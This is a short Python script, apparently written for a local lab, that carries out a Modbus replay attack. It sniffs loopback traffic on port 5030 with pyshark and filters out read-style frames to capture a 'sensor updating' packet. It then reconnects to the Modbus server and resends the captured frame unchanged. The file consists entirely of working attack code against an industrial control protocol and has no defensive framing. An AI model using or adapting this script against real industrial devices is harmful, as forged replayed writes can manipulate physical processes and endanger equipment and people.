from concurrent.futures import thread
import socket
import pyshark

CAPTURE_FILTER = "tcp.port == 5030"
LOCAL_ADDRESS = 'localhost'
PORT = 5030

# Define the byte patterns to check
exclude_pattern = b'\x00\x06\x01\x03\x00\x00\x00\x01'

cap = pyshark.LiveCapture(interface='Adapter for loopback traffic capture', display_filter=CAPTURE_FILTER)
payload = None

# Sniff packets on Adapter for loopback traffic capture 
# interface using 5030 port until a packet on TCP with payload is found
for packet in cap.sniff_continuously():
        if hasattr(packet, 'tcp') and hasattr(packet, 'Data') and hasattr(packet.Data, 'Data'):
            payload = bytes.fromhex(packet.Data.Data)
            print(f"Found a Modbus packet. Packet Data: {payload}")

            if not payload.endswith(exclude_pattern):
                print(f"Found sensor updating packet. Payload: {payload}")
                break

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    try:
        sock.settimeout(60)
        sock.connect((LOCAL_ADDRESS, PORT))  # Connect to Modbus server
        print(f"Connected, replaying the message {payload}")

        sock.sendall(payload)  # Send Modbus frame
        response = sock.recv(1024)  # Receive server's response
        
        print("Sent Request:", payload.hex())
        print("Received Response:", response.hex())

    except Exception as e:
        print(f"Error sending Modbus request: {e}")